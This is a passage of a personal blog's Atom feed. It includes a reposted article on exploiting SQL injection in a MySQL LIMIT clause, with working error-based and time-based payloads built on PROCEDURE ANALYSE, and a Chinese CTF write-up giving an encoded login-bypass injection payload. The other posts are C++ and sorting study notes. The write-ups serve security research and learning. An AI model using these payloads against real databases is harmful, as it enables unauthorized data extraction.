      <category term="sql_injection" scheme="http://edward-l.github.io/tags/sql-injection/"/>
    
      <category term="writeup" scheme="http://edward-l.github.io/categories/writeup/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[SQL Injections in MySQL LIMIT clause]]></title>
    <link href="http://edward-l.github.io/2015/02/06/SQL%20Injections%20in%20MySQL%20LIMIT%20clause/"/>
    <id>http://edward-l.github.io/2015/02/06/SQL Injections in MySQL LIMIT clause/</id>
    <published>2015-02-05T17:30:16.000Z</published>
    <updated>2015-04-14T10:51:11.000Z</updated>
    <content type="html"><![CDATA[<p>Countless number of articles was written on the exploitation of SQL Injections. This post is dedicated to a very specific situation. When assessing the severity of SQL Injection in certain application, I encountered a problem, which I was not able to solve quickly using web search. It’s about a question if SQL injection vulnerability in the LIMIT clause in MySQL 5.x database is currently exploitable.<br><a id="more"></a><br>Example query:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> <span class="keyword">field</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> id &gt; <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id <span class="keyword">LIMIT</span> injection_point</span></span><br></pre></td></tr></table></figure></p>
<p>Of course, important is the fact that the above query contains ORDER BY clause. In MySQL we cannot use ORDER BY before UNION. If ORDER BY was not there it would be actually very easy to exploit it simply using just UNION syntax. The problem has appeared at stackoverflow and it was discussed at sla.ckers too. Sorry no results.</p>
<p>So let’s look at the syntax of the SELECT in the MySQL 5 documentation</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span></span><br><span class="line">    [<span class="keyword">ALL</span> | <span class="keyword">DISTINCT</span> | <span class="keyword">DISTINCTROW</span> ]</span><br><span class="line">      [<span class="keyword">HIGH_PRIORITY</span>]</span><br><span class="line">      [<span class="keyword">STRAIGHT_JOIN</span>]</span><br><span class="line">      [<span class="keyword">SQL_SMALL_RESULT</span>] [<span class="keyword">SQL_BIG_RESULT</span>] [<span class="keyword">SQL_BUFFER_RESULT</span>]</span><br><span class="line">      [<span class="keyword">SQL_CACHE</span> | <span class="keyword">SQL_NO_CACHE</span>] [<span class="keyword">SQL_CALC_FOUND_ROWS</span>]</span><br><span class="line">    select_expr [, select_expr ...]</span><br><span class="line">    [<span class="keyword">FROM</span> table_references</span><br><span class="line">    [<span class="keyword">WHERE</span> where_condition]</span><br><span class="line">    [<span class="keyword">GROUP</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]]</span><br><span class="line">    [<span class="keyword">HAVING</span> where_condition]</span><br><span class="line">    [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...]</span><br><span class="line">    [<span class="keyword">LIMIT</span> &#123;[offset,] <span class="keyword">row_count</span> | <span class="keyword">row_count</span> OFFSET offset&#125;]</span><br><span class="line">    [<span class="keyword">PROCEDURE</span> procedure_name(argument_list)]</span><br><span class="line">    [<span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'file_name'</span> export_options</span><br><span class="line">      | <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'file_name'</span></span><br><span class="line">      | <span class="keyword">INTO</span> var_name [, var_name]]</span><br><span class="line">    [<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> | <span class="keyword">LOCK</span> <span class="keyword">IN</span> <span class="keyword">SHARE</span> <span class="keyword">MODE</span>]]</span></span><br></pre></td></tr></table></figure>
<p>After the LIMIT clause may occur following clauses: PROCEDURE and INTO. This INTO clause is not interesting, unless the application uses a database account with permission to write files, which nowadays is rather rare situation in the wild. It turns out that it is possible to solve our problem using PROCEDURE clause.</p>
<p>The only stored procedure available by default in MySQL is ANALYSE  (see docs).</p>
<p>Let’s give it a try:<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> field <span class="keyword">FROM</span> table <span class="keyword">where</span> id &gt; <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="function"><span class="keyword">PROCEDURE</span> <span class="title">ANALYSE</span><span class="params">(1)</span>;</span></span><br><span class="line"> </span><br><span class="line">ERROR <span class="number">1386</span> (HY000): Can<span class="string">'t use ORDER clause with this procedure</span></span><br></pre></td></tr></table></figure></p>
<p>ANALYSE procedure can also take two parameters:<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> field <span class="keyword">FROM</span> table <span class="keyword">where</span> id &gt; <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="function"><span class="keyword">PROCEDURE</span> <span class="title">ANALYSE</span><span class="params">(1,1)</span>;</span></span><br><span class="line"> </span><br><span class="line">ERROR <span class="number">1386</span> (HY000): Can<span class="string">'t use ORDER clause with this procedure</span></span><br></pre></td></tr></table></figure></p>
<p>Does not bode us well. Let’s see whether the parameters of ANALYSE are evaluated.</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> field <span class="keyword">from</span> table <span class="keyword">where</span> id &gt; <span class="number">0</span> <span class="keyword">order</span> <span class="keyword">by</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="function"><span class="keyword">procedure</span> <span class="title">analyse</span><span class="params">((<span class="keyword">select</span> <span class="keyword">IF</span>(MID(version()</span>,1,1) <span class="title">LIKE</span> 5, <span class="title">sleep</span><span class="params">(5)</span>,1)),1);</span></span><br></pre></td></tr></table></figure>
<p>gives us immediate response:<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR <span class="number">1108</span> (HY000): Incorrect parameters <span class="keyword">to</span> <span class="function"><span class="keyword">procedure</span> '<span class="title">analyse</span>’</span></span><br></pre></td></tr></table></figure></p>
<p>Therefore, sleep() is certainly not being called. I didn’t give up so fast and I finally found the vector:</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> field <span class="keyword">FROM</span> user <span class="keyword">WHERE</span> id &gt;<span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="function"><span class="keyword">procedure</span> <span class="title">analyse</span><span class="params">(extractvalue(rand()</span>,<span class="title">concat</span><span class="params">(0x3a,version()</span>)),1);</span></span><br><span class="line"> </span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">':5.5.41-0ubuntu0.14.04.1'</span></span><br></pre></td></tr></table></figure>
<p>Voilà! The above solution is based on handy known technique of so-called error based injection. If, therefore, our vulnerable web application discloses the errors of the database engine (this is a real chance, such bad practices are common), we solve the problem. What if our target doesn’t display errors? Are we still able to exploit it successfully?</p>
<p>It turns out that we can combine the above method with another well-known technique – time based injection. In this case, our solution will be as follows:</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field <span class="keyword">FROM</span> table <span class="keyword">WHERE</span> id &gt; <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="function"><span class="keyword">PROCEDURE</span> <span class="title">analyse</span><span class="params">((<span class="keyword">select</span> extractvalue(rand()</span>,<span class="title">concat</span><span class="params">(0x3a,(<span class="keyword">IF</span>(MID(version()</span>,1,1) <span class="title">LIKE</span> 5, <span class="title">BENCHMARK</span><span class="params">(5000000,SHA1(1)</span>),1))))),1)</span></span><br></pre></td></tr></table></figure>
<p>It works. What is interesting that using SLEEP is not possible in this case. That’s why there must be a BENCHMARK instead.</p>
<p>Update: As BigBear pointed out in the comment, very similar solution was actually posted earlier on rdot. Thanks!</p>
<p>Update: It would be awesome if this technique is implemented in sqlmap.</p>
<p>原文地址：<a href="https://rateip.com/blog/sql-injections-in-mysql-limit-clause/" target="_blank" rel="external">https://rateip.com/blog/sql-injections-in-mysql-limit-clause/</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>Countless number of articles was written on the exploitation of SQL Injections. This post is dedicated to a very specific situation. When assessing the severity of SQL Injection in certain application, I encountered a problem, which I was not able to solve quickly using web search. It’s about a question if SQL injection vulnerability in the LIMIT clause in MySQL 5.x database is currently exploitable.<br>]]>
    
    </summary>
    
      <category term="limit注入" scheme="http://edward-l.github.io/tags/limit%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sql_injection" scheme="http://edward-l.github.io/tags/sql-injection/"/>
    
      <category term="injection" scheme="http://edward-l.github.io/categories/injection/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[hduisa_ctf_week1_writeup]]></title>
    <link href="http://edward-l.github.io/2015/01/28/hduisa_ctf_week1_writeup/"/>
    <id>http://edward-l.github.io/2015/01/28/hduisa_ctf_week1_writeup/</id>
    <published>2015-01-28T07:30:16.000Z</published>
    <updated>2015-02-05T16:20:41.000Z</updated>
    <content type="html"><![CDATA[<h3 id="Problem_ID:4">Problem ID:4</h3><h3 id="小明的女神">小明的女神</h3><p>一看简单的一张女神的照片，一开始想图片里可能有什么隐藏的东西，但是想想是web的集训，就看了下网页的源代码，发现里面注释掉了很大的一堆文字，然后猜了下base64，<a href="http://www.edwardl.xyz/2014/09/28/base64%20encodestring&amp;decodestring/" target="_blank" rel="external">用 python解了下</a>，发现也是一张图片。两个图片比较下，发现了这个东西。<code>74.117.56.51.114.111.67.51</code>,asc码解了下，<code>J.u.8.3.r.o.C.3</code>构造在女神的网址后<code>http://104.236.171.163/week1/nvshen/Ju83roC3/</code>，就done了第一题。<br><a id="more"></a></p>
<h3 id="Problem_ID:5">Problem ID:5</h3><h3 id="Get_Response!">Get Response!</h3><p>一看到题其实也就想到了alictf的那道题。那时做那道题的时候没什么思路啊，后来是lightless和airbasic两个人做的。但是我清楚的记得是用@的url黑魔法，后来lightless给的提示也证明了是这道题改编的。我按照那道题的原来的思路做想要重定向到help.php页面无果，后来才发现奥妙在help.php页面的错误提示里，不断刷新得到<code>R2V0IFJlc3BvbnNlIEZyb20gaGR1aXNhLmNu</code>.<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">s = <span class="string">'R2V0IFJlc3BvbnNlIEZyb20gaGR1aXNhLmNu'</span></span><br><span class="line">des = base64.<span class="function"><span class="title">decodestring</span><span class="params">(s)</span></span></span><br><span class="line">print des</span><br></pre></td></tr></table></figure></p>
<p>得知要重定向到<code>hduisa.cn</code>,又done一题。</p>
<h3 id="Problem_ID:6">Problem ID:6</h3><h3 id="Easy_SQLi">Easy SQLi</h3><p>这题没有hint之前确实没什么进展<br>但是一有hint就很简单了。<br>大概就是用post提交表单，base64加密，然后就是过滤了and&amp;or。<br>剩下就是构造payload了，本以为会秒做的，结果在<code>&#39;</code>的问题上耽误了好久。各种尝试最后得到最后的payload，<code>username=MSd8fCcxJz0nMScj&amp;password=aa</code>。<br>第一个ak。可惜排名在第二。陪老爸看了太久的中央新闻(我是好孩子)，没拿到一个一血。不过学到了很多。<br>期待week2。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="Problem_ID:4">Problem ID:4</h3><h3 id="小明的女神">小明的女神</h3><p>一看简单的一张女神的照片，一开始想图片里可能有什么隐藏的东西，但是想想是web的集训，就看了下网页的源代码，发现里面注释掉了很大的一堆文字，然后猜了下base64，<a href="http://www.edwardl.xyz/2014/09/28/base64%20encodestring&amp;decodestring/">用 python解了下</a>，发现也是一张图片。两个图片比较下，发现了这个东西。<code>74.117.56.51.114.111.67.51</code>,asc码解了下，<code>J.u.8.3.r.o.C.3</code>构造在女神的网址后<code>http://104.236.171.163/week1/nvshen/Ju83roC3/</code>，就done了第一题。<br>]]>
    
    </summary>
    
      <category term="hduisa_ctf" scheme="http://edward-l.github.io/tags/hduisa-ctf/"/>
    
      <category term="sql_injection" scheme="http://edward-l.github.io/tags/sql-injection/"/>
    
      <category term="writeup" scheme="http://edward-l.github.io/categories/writeup/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[learn c++ in few minutes]]></title>
    <link href="http://edward-l.github.io/2015/01/13/learn%20c++%20in%20few%20minutes/"/>
    <id>http://edward-l.github.io/2015/01/13/learn c++ in few minutes/</id>
    <published>2015-01-12T17:30:16.000Z</published>
    <updated>2015-01-15T04:33:34.000Z</updated>
    <content type="html"><![CDATA[<h2 id="const与指针">const与指针</h2><ul>
<li>野指针指未初始化的指针</li>
<li>空指针可以确保不指向任何对象或者函数</li>
<li><code>int const *p = NULL</code> &lt;=&gt; <code>const int *p = NULL</code><br>定义了一个<em>指向const变量的指针</em>，不能通过指针去修改他所指向的变量的值，但是可以改变指针的指向的变量。</li>
<li><code>int * const p = &amp;a</code><br>定义了一个<em>const指针</em>，<strong>注意的是，在定义的同时必须要初始化指向一个<code>a</code></strong>,我们不能改变指针的指向，但是我们可以通过指针改变变量的内容。<a id="more"></a>
</li>
</ul>
<h2 id="void指针">void指针</h2><ul>
<li>又叫<em>无类型指针</em>,可以指向任何类型的指针，但是在使用时必须将其进行强制转化。<br>eg:<pre>
cout << * (int *)p << endl;
q = (int *) p
</pre>

</li>
</ul>
<h2 id="new&amp;delete">new&amp;delete</h2><ul>
<li><p><code>new</code>用来动态申请内存。<br><em>指针变量 ＝ new 数据类型</em><br><em>指针变量 ＝ new 数据类型（初值）</em><br>申请连续时：<br><em>指针变量 ＝ new 数据类型[元素个数]</em><br>正确返回一个指针类型，申请失败则返回一个空指针。</p>
</li>
<li><p><code>delete</code>用来释放内存空间。<br><em>delete 指针变量</em><br>连续时用下面的，否则可能造成内存泄漏<br><em>delete [] 指针变量</em></p>
</li>
</ul>
<h2 id="引用">引用</h2><ul>
<li><em>类型标示符 &amp; 引用名 ＝ 目标变量名</em><br>操作与对改变量进行操作一样，需要注意的是:<br>1.不能建立<code>void</code>的类型的引用<br>2.不能建立数组的引用<br>3.可以将变量的引用的地址赋给一个指针，指向的是原来的地址<br>4可以建立指针变量的引用</li>
</ul>
<h2 id="函数默认参数">函数默认参数</h2><ul>
<li>实参与形参的结合是结合方式是从左向右的，所以，带有默认值的参数必须放在形参表的右端。</li>
</ul>
<h2 id="函数重载">函数重载</h2><ul>
<li>函数名字相同，参数不同</li>
</ul>
<h2 id="内置函数">内置函数</h2><ul>
<li>在函数首行加上<code>inline</code>即可</li>
</ul>
<h2 id="类与对象">类与对象</h2><ul>
<li><p>类外定义成员函数</p>
<pre>
void Students::show()
{
  pass
}
</pre>
</li>
<li><p>构造函数<br>1.在创建对象时对其进行初始化<br>2.与类名相同，没有返回值<br>3.创建时自动调用<br>4.创建时必须执行，否则无法创建</p>
</li>
<li><p>析构函数<br>在系统释放占用对象内存前进行一些清理工作<br>1.～函数名<br>2.同样的自动调用<br>3.先构造的后析构，后构造的先析构</p>
</li>
<li><p>对象数组<br>1.<code>Student student[3]={1,2,3}</code></p>
</li>
<li><p>对象指针<br>1.<code>p-&gt;value</code> &lt;=&gt; <code>(*p).value</code><br>2.指向对象数据成员的指针<br><em>指针 ＝ &amp; 对象名.数据成员名</em><br>3.指向对象成员函数的指针<br><em>指针 ＝ &amp; 类名::成员函数名</em></p>
</li>
<li><p>常对象<br><em>const 类名 对象名［（实参表）］
</em>类名 const 对象名［（实参表）］<br>1.常数据成员的参数初始化</p>
<pre>
Box::box(int a,int b,int c) : length (a)
{
  width = b;
  length = c;
}
</pre>

</li>
</ul>
<p>2.常引用<br><em>const 类名 &amp;引用名 ＝ 对象名</em></p>
<h2 id="继承与组合">继承与组合</h2><ul>
<li><p>派生类</p>
<pre>
class 派生类名:[继承方式] 基类名
{
派生类新增加的成员
}
</pre>
</li>
<li><p>构造函数<br><em>&lt;派生类构造函数名（&lt;总参数列表&gt;）:&lt;基类构造函数名&gt;（&lt;参数列表名&gt;）&gt;</em><br><br></p>
<pre>
Student(char *Name, int num, char ID):Person(Name,num)
</pre>
</li>
<li><p>多重继承<br><em>&lt;派生类名&gt;(&lt;总参数列表&gt;):&lt;基类名1&gt;（&lt;参数表1&gt;）,&lt;基类名2&gt;（&lt;参数表2&gt;）</em></p>
</li>
<li><p>虚基类<br>1.虚基类并不是在声明基类时声明的，而是在声明派生类的指定继承方式时声明的。<br><em>class 派生类名: virtual 继承方式 基类名</em></p>
</li>
</ul>
<h2 id="多态">多态</h2><ul>
<li>一个接口多种方法</li>
<li>用功能晚绑定实现多态</li>
<li>虚函数<pre>
virtual 函数类型 函数名（形参表）
｛
  pass
｝
</pre>

</li>
</ul>
<p>可以在派生类中重新被定义，但是<strong>其函数原型必须和基类中的一样</strong></p>
<ul>
<li>纯虚函数<br><em>virtual 函数类型 函数名（参数表）＝ 0</em></li>
<li>抽象类<br>至少含有一个纯虚函数</li>
</ul>
<h2 id="友元">友元</h2><ul>
<li>用<code>friend</code>对其声明，可以访问类的任何成员</li>
<li>友元关系不能传递</li>
</ul>
<h2 id="静态成员">静态成员</h2><ul>
<li>以<code>static</code>开头，可以被各对象所共享</li>
<li>可以被初始化，但是只能再类体外进行初始化<br><em>数据类型 类名::静态数据成员名＝数值</em></li>
<li>没有定义类对象也可以通过类名访问静态数据成员<br><em>Student::stu_count</em></li>
<li>静态成员函数只能访问静态数据成员</li>
</ul>
<h2 id="运算符重载">运算符重载</h2><ul>
<li><pre>
函数类型 operator 运算符名称（形参列表）
{
  对运算符的重载处理
}</pre>

</li>
</ul>
<h2 id="显示类型转换">显示类型转换</h2><ul>
<li><em>类型名（表达式）</em></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="const与指针">const与指针</h2><ul>
<li>野指针指未初始化的指针</li>
<li>空指针可以确保不指向任何对象或者函数</li>
<li><code>int const *p = NULL</code> &lt;=&gt; <code>const int *p = NULL</code><br>定义了一个<em>指向const变量的指针</em>，不能通过指针去修改他所指向的变量的值，但是可以改变指针的指向的变量。</li>
<li><code>int * const p = &amp;a</code><br>定义了一个<em>const指针</em>，<strong>注意的是，在定义的同时必须要初始化指向一个<code>a</code></strong>,我们不能改变指针的指向，但是我们可以通过指针改变变量的内容。]]>
    
    </summary>
    
      <category term="c++" scheme="http://edward-l.github.io/tags/c/"/>
    
      <category term="c++" scheme="http://edward-l.github.io/categories/c/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[排序小结]]></title>
    <link href="http://edward-l.github.io/2015/01/06/%E6%8E%92%E5%BA%8F%E5%B0%8F%E7%BB%93/"/>
    <id>http://edward-l.github.io/2015/01/06/排序小结/</id>
    <published>2015-01-05T20:06:16.000Z</published>
    <updated>2015-01-05T18:39:26.000Z</updated>
    <content type="html"><![CDATA[<h2 id="哈希散列">哈希散列</h2><blockquote>
<ul>
<li>散列（哈希）表查找<br>  √类似数学中的函数的概念<code>f(x)=y</code>的概念；</li>
<li>散列函数的构造方法<br>  √计算简单＋分布均匀＝优秀的散列函数  <a id="more"></a>
  1.直接定址法<br>  √ <code>f(key)= a * key + b</code><br>  2.数字分析法<br>  √就类似找不同，找出有特点的，不一样的作为散列地址<br>  3.平方取中法<br>  √平方后取出中间几位作为散列地址<br>  √适用于数不是很大，不知道怎么分布<br>  4.折叠法<br>  √从左到右分割成几部分（不足补零）后叠加，作为散列地址<br>  √数字位数较多<br>  5.除留余数法<br>  √<code>f(key) = key mod p(p &lt; m)</code><br>  √<code>p</code>是关键最好是小于<code>m</code>的最大因数?<code>p</code>为质数或不包含小于20的质因数的合数<br>  6.随机数法<br>  √<code>f(key)=random(key)</code></li>
<li>处理散列冲突的方法<br>  1.开放地址法<br>  √发生冲突后寻找下一个散列地址去存储<br>  √利用平方，正负，随机来解决堆积<br>  2.再哈希函数法<br>  √<code>f(key) = RHi(key)</code><br>  3.链地址法<br>  √类似邻接表<br>  4.公共溢出区法</li>
</ul>
</blockquote>
<h2 id="排序方法小结">排序方法小结</h2><blockquote>
<ul>
<li>简单排序法<br>  1.直接插入排序排序(<code>InsertSort</code>)<br>  √一个一个插，从第一个开始，每插一次多一个数据，全部插完即排完<br>  √时间复杂度为<code>O(n^2)</code><br>  2.冒泡排序（<code>BubbleSort</code>）<br>  √每趟都是前后两个交换大的后移，直到最大的冒到最上面，<br>  √时间复杂度为<code>O(n^2)</code><br>  3.链序列插入排序（内含插入（<code>Ins_TSort</code>)和重排（<code>arrange</code>））<br>  4.简单选择排序（<code>SelectSort</code>）<br>  √每次选出最小的放在最前面进行排序</li>
<li>高效排序法<br>  1.希尔排序（<code>ShellSort</code>）<br>  √分成若干个子序列，按增量进行排序，增量越来越小，最后为一<br>  √增量序列中的值没有出了1以外的公因子，最后一个必须为一<br>  2.快速排序法（<code>QuickSort</code>）<br>  √每次的第一个作为枢轴，类似不断累加的二分法<br>  √平均时间为<code>knln(n)</code><br>  3.堆排序（<code>HeapSort</code>）<br>  √先形成一个树，树的所有节点都大于等于左右孩子<br>  √然后把最后一个子叶与堆顶元素对换，保持调维持上面的姿势<br>  4.树形选择排序（锦标赛排序）（<code>Tournament</code>）<br>  5.归并排序（<code>MergeSort</code>）<br>  √从两个开始归并保持有序，然后是4，8，直到全部归并结束</li>
<li>基数排序法（<code>RadixSort</code>）<br>  1.举个例子<br>  √ 分牌按花色和数字<br>  √数字排序从个位十位百位排序</li>
</ul>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="哈希散列">哈希散列</h2><blockquote>
<ul>
<li>散列（哈希）表查找<br>  √类似数学中的函数的概念<code>f(x)=y</code>的概念；</li>
<li>散列函数的构造方法<br>  √计算简单＋分布均匀＝优秀的散列函数]]>
    
    </summary>
    
      <category term="排序" scheme="http://edward-l.github.io/tags/%E6%8E%92%E5%BA%8F/"/>
    
      <category term="散列" scheme="http://edward-l.github.io/tags/%E6%95%A3%E5%88%97/"/>
    
      <category term="za" scheme="http://edward-l.github.io/categories/za/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[c++ 友元&运算符重载]]></title>
    <link href="http://edward-l.github.io/2014/12/22/c++%20%E5%8F%8B%E5%85%83&%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD/"/>
    <id>http://edward-l.github.io/2014/12/22/c++ 友元&运算符重载/</id>
    <published>2014-12-22T07:30:16.000Z</published>
    <updated>2014-12-22T10:36:10.000Z</updated>
    <content type="html"><![CDATA[<p>1、 定义一个复数类，重载“-=”运算符，使这个运算符能直接完成复数的“-=”运算。<br>•分别用成员函数与友元函数编写运算符重载函数；<br>•在主函数中定义复数对象c1(10,20)、c2(15,30)，进行c2-=c1的复数运算，并输出c1、c2的复数值。<br><a id="more"></a><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  main.cpp</span></span><br><span class="line"><span class="comment">//  9－1</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by  Edward.L on 12/16/14.</span></span><br><span class="line"><span class="comment">//  Copyright (c) 2014  Edward.L. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;iostream&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Complex</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    Complex(<span class="keyword">double</span> r = <span class="number">0</span>, <span class="keyword">double</span> i = <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        real = r;</span><br><span class="line">        image = i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//重载运算符作为类的成员函数</span></span><br><span class="line">    Complex <span class="keyword">operator</span> -= (Complex c1);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//重载运算符作为类的友元函数</span></span><br><span class="line">    <span class="keyword">friend</span> Complex <span class="keyword">operator</span> -= (Complex c1, Complex c2);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">double</span> real, image;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> Complex::display()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"c2 -= c1"</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义作为成员函数的重载函数</span></span><br><span class="line">Complex Complex::<span class="keyword">operator</span>-=(Complex c1)</span><br><span class="line">&#123;</span><br><span class="line">    Complex c3;</span><br><span class="line">    c3.real = real - c1.real;</span><br><span class="line">    c3.image = image - c1.image;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"c1 = ("</span> &lt;&lt; c1.real &lt;&lt; <span class="string">", "</span> &lt;&lt; c1.image &lt;&lt; <span class="string">"i)"</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"c2 = ("</span> &lt;&lt; c3.real &lt;&lt; <span class="string">", "</span> &lt;&lt; c3.image &lt;&lt; <span class="string">"i)"</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> c3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义作为友元函数的重载函数</span></span><br><span class="line">Complex <span class="keyword">operator</span> -= (Complex c1, Complex c2)</span><br><span class="line">&#123;</span><br><span class="line">    Complex c3;</span><br><span class="line">    c3.real = c2.real - c1.real;</span><br><span class="line">    c3.image = c2.image - c1.image;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"c1 = ("</span> &lt;&lt; c1.real &lt;&lt; <span class="string">", "</span> &lt;&lt; c1.image &lt;&lt; <span class="string">"i)"</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"c2 = ("</span> &lt;&lt; c3.real &lt;&lt; <span class="string">", "</span> &lt;&lt; c3.image &lt;&lt; <span class="string">"i)"</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> c3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="function">Complex <span class="title">c1</span><span class="params">(10,20)</span></span>;</span><br><span class="line">    <span class="function">Complex <span class="title">c2</span><span class="params">(15,30)</span></span>;</span><br><span 